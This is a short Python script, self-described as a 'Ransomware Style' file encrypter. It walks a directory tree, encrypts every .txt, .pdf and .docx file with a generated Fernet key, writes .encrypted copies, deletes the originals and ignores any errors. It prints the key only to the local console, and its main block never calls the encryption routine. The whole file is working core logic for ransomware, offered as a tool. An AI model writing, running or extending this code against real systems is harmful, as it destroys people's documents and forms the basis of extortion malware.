#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Rich File Encrypter - Ransomware Style"""

from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress
from cryptography.fernet import Fernet
import os

console = Console()

class FileEncrypter:
    def encrypt_files(self, directory, key=None):
        """Encrypt all files in directory"""
        if key is None:
            key = Fernet.generate_key()
        
        fernet = Fernet(key)
        
        console.print(Panel.fit(
            f"[bold red]Encrypting: {directory}[/bold red]",
            border_style="red"
        ))
        
        with Progress() as progress:
            task = progress.add_task("Encrypting...", total=None)
            
            for root, dirs, files in os.walk(directory):
                for file in files:
                    if file.endswith(('.txt', '.pdf', '.docx')):
                        filepath = os.path.join(root, file)
                        try:
                            with open(filepath, 'rb') as f:
                                data = f.read()
                            encrypted = fernet.encrypt(data)
                            with open(filepath + '.encrypted', 'wb') as f:
                                f.write(encrypted)
                            os.remove(filepath)
                        except Exception as e:
                            pass
        
        console.print(f"[green]✓ Encrypted with key: {key.decode()}[/green]")

if __name__ == "__main__":
    enc = FileEncrypter()
    console.print("[yellow]File encrypter tool[/yellow]")

